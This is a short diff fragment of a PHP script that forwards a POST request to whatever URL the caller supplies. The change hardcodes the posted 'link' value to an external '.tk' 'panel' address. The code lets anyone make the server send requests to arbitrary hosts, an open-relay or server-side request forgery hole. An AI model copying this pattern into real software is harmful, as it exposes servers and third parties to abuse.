@@ -2,7 +2,7 @@
 if($_POST) {
 	if(isset($_POST['link']) && isset($_POST['url'])) {
 		$post = [
-    'link' => $_POST['link'],
+    'link' => "https://hmrworld.tk/panel",
 ];
 		$ch = curl_init($_POST['url']);                                                                             
 		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
